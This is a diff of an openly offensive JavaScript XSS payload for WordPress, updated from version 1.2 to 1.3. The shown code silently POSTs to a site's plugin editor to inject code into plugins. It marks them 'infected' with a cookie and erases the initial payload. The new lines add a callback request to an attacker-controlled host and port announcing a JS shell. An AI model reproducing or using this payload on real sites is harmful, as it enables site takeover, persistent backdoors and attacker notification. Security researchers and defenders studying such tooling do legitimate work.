@@ -1,7 +1,13 @@
 // WordPress Core Payload
 // Author: Hans-Michael Varbaek
 // Company: Sense of Security
-// Version: 1.2
+// 
+// Version: 1.3 - 2016
+//
+// Changelog: 
+// - Ver 1.3: Added XMLHttpRequest for JS Notification
+// - Ver 1.3: request.open() on Line 62 is now set by xsser.py
+//
 // Credits: InterN0T
 //
 // Usage Notes:
@@ -18,8 +24,9 @@
 // Requirements: 
 // 1) Ability to edit plugin files. (Default feature. However, this is typically disabled in hardened configurations.)
 //
-// Tested Browser:
-// Chrome (latest version - 14 Nov 2015)
+// Tested Browsers:
+// - Chrome (14 Nov 2015) - This should still work.
+// - FireFox (04 Nov 2016)
 // 
 // For ethical and legal purposes only. This script is provided as is and without warranty.
 
@@ -54,14 +61,20 @@ function silent_plugins_inject() {
    var request = new XMLHttpRequest();
 
    // Method and URL to send the request to
-   request.open("POST", "http://TARGETWEBSITE/wp-admin/plugin-editor.php"); // This variable needs to be dynamic in the next version.
+   request.open("POST", "http://TARGETWEBSITE/wp-admin/plugin-editor.php"); // Set by xsser.py in this version.
    // Example contents: http://www.some-wordpress-website.tld/wp-admin/plugin-editor.php
 
    // Send the request with our form data
    request.send(formData);
 
    SetCookie("Plugins_Infected","true"); // Prevent re-infection / loops
-   clean_up();
+
+   // NEW FEATURE
+   var request = new XMLHttpRequest(); // Initiate XMLHttpRequest
+   request.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt"); // Method and URL to send the request to - Hostname and port are set by xsser.py
+   request.send(); // Send the request
+
+   clean_up(); // Remove initial payload from server
 
    }
 }
